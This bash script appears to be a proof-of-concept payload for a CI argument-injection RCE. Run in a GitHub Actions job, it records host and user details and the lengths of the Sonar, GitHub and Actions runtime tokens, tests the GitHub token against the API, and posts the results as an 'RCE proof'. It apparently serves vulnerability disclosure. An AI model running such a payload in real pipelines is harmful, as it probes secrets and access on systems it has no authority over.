#!/bin/bash
set -u
out="${GITHUB_WORKSPACE:-.}/pwned_args.txt"
code=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer ${GITHUB_TOKEN:-}" \
  https://api.github.com/repos/PDFtoMark/gab-poc-sonar-javaexe/pulls 2>/dev/null || echo curl-error)
{
  echo "RCE-ARGS host=$(hostname) user=$(id -un) cwd=$(pwd)"
  echo "SONAR_TOKEN_len=${#SONAR_TOKEN} GITHUB_TOKEN_len=${#GITHUB_TOKEN} ACTIONS_RUNTIME_TOKEN_len=${#ACTIONS_RUNTIME_TOKEN}"
  echo "github_api_status=$code"
} > "$out"
cat "$out"
{
  echo '### RCE proof - artifact-derived -D argument injection vector'
  echo '```'
  cat "$out"
  echo '```'
} >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
exit 0
